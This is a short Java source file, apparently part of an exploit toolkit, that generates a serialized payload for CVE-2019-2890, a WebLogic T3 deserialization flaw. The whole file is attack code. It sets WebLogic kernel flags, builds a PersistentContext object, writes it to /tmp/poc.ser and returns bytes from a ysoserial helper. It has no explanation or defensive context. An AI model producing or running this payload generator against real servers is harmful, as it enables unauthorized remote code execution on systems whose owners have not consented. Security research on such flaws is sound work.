package com.payload.t3;


import util.Ysoserial;
import weblogic.kernel.KernelStatus;
import weblogic.wsee.jaxws.persistence.PersistentContext;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class CVE_2019_2890 {
    public static void main(String[] args) throws IOException {

        payload();
    }
    public static byte[] payload() throws IOException {
        System.setProperty("com.bea.core.internal.client","true");
        KernelStatus.setIsServer(true);
        PersistentContext pc = new PersistentContext(null,null,null,null,null);
        FileOutputStream fos = new FileOutputStream("/tmp/poc.ser");
        ObjectOutputStream out = new ObjectOutputStream(fos);
        out.writeObject(pc);
        out.close();
        byte[] payload1 = Ysoserial.serial(pc);
        return payload1;

    }

}
